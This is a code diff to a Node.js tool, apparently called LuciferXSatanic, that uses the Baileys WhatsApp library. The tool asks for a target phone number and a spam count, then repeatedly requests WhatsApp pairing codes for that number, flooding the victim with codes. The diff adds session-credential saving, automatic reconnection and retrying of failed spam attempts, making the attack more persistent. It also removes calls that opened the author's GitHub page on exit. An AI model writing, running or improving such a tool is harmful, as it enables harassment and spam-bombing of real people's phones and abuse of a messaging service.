@@ -1,7 +1,6 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
 const pino = require('pino');
 const readline = require("readline");
-const open = require('open');
 
 const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
 const wColor = color[Math.floor(Math.random() * color.length)];
@@ -33,8 +32,9 @@ async function loadingSpinner(text, duration = 2000, interval = 100) {
     process.stdout.write('\r' + ' '.repeat(50) + '\r');
 }
 
-async function LuciferXSatanic() {
-    const { state } = await useMultiFileAuthState('./LUCIFER/session');
+async function connectToWhatsApp() {
+    const { state, saveCreds } = await useMultiFileAuthState('./LUCIFER/session');
+    
     const LuciferBot = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
@@ -50,6 +50,35 @@ async function LuciferXSatanic() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
 
+    LuciferBot.ev.on('creds.update', saveCreds);
+    
+    LuciferBot.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log(wColor + '\n接続が閉じられました。再接続を試行しています。' + xColor);
+            if (shouldReconnect) {
+                setTimeout(connectToWhatsApp, 5000); 
+            }
+        } else if (connection === 'open') {
+            console.log(wColor + '\nWhatsAppに正常に接続しました。' + xColor);
+        }
+    });
+
+    return LuciferBot;
+}
+
+async function LuciferXSatanic() {
+    let LuciferBot = await connectToWhatsApp();
+    
+    LuciferBot.ev.on('connection.update', (update) => {
+        if (update.connection === 'open') {
+            mainLoop(LuciferBot);
+        }
+    });
+}
+
+async function mainLoop(LuciferBot) {
     while (true) {
         console.clear();
         console.log(wColor + `
@@ -69,7 +98,6 @@ async function LuciferXSatanic() {
             let rawNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
             if (rawNumber.toLowerCase() === 'exit') {
                 console.log('外出');
-                await open('https://github.com/hazelnuttty');
                 process.exit(0);
             }
             let phoneNumber = normalizePhoneNumber(rawNumber);
@@ -82,7 +110,6 @@ async function LuciferXSatanic() {
             let rawCount = await question(wColor + 'スパム回数を入力してください : ' + xColor);
             if (rawCount.toLowerCase() === 'exit') {
                 console.log('外出');
-                await open('https://github.com/hazelnuttty');
                 process.exit(0);
             }
             const LuciferCodes = parseInt(rawCount);
@@ -94,12 +121,19 @@ async function LuciferXSatanic() {
 
             for (let i = 0; i < LuciferCodes; i++) {
                 try {
-                    await loadingSpinner(`荷物の送付先 ${phoneNumber}`, 2000, 200);
+                    await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                     let code = await LuciferBot.requestPairingCode(phoneNumber);
                     code = code?.match(/.{1,4}/g)?.join("-") || code;
                     console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
                 } catch (error) {
                     console.error('エラー:', error.message);
+                    if (error.message.includes('disconnected') || error.message.includes('connection')) {
+                        console.log(wColor + '接続が失われました。再接続を試行しています' + xColor);
+                        LuciferBot = await connectToWhatsApp();
+                        i--; 
+                        await delay(5000);
+                        continue;
+                    }
                 }
                 await delay(5000);
             }
